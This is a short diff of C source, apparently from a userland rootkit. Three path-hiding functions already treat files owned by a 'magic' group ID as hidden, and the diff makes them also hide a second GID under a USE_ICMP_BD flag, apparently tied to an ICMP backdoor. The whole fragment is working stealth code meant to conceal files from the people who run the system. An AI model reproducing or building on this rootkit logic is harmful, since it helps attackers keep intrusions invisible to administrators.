@@ -12,11 +12,19 @@ int _hidden_path(const char *pathname, short mode){
             pathgid = get_path_gid(pathname);
             if(pathgid == magicgid)
                 return 1;
+#ifdef USE_ICMP_BD
+            if(pathgid == magicgid-1)
+                return 1;
+#endif
             break;
         case MODE_64:
             pathgid = get_path_gid64(pathname);
             if(pathgid == magicgid)
                 return 1;
+#ifdef USE_ICMP_BD
+            if(pathgid == magicgid-1)
+                return 1;
+#endif
             break;
     }
 
@@ -36,11 +44,19 @@ int _f_hidden_path(int fd, short mode){
             pathgid = get_fd_gid(fd);
             if(pathgid == magicgid)
                 return 1;
+#ifdef USE_ICMP_BD
+            if(pathgid == magicgid-1)
+                return 1;
+#endif
             break;
         case MODE_64:
             pathgid = get_fd_gid64(fd);
             if(pathgid == magicgid)
                 return 1;
+#ifdef USE_ICMP_BD
+            if(pathgid == magicgid-1)
+                return 1;
+#endif
             break;
     }
 
@@ -63,11 +79,19 @@ int _l_hidden_path(const char *pathname, short mode){
             pathgid = lget_path_gid(pathname);
             if(pathgid == magicgid)
                 return 1;
+#ifdef USE_ICMP_BD
+            if(pathgid == magicgid-1)
+                return 1;
+#endif
             break;
         case MODE_64:
             pathgid = lget_path_gid64(pathname);
             if(pathgid == magicgid)
                 return 1;
+#ifdef USE_ICMP_BD
+            if(pathgid == magicgid-1)
+                return 1;
+#endif
             break;
     }
 
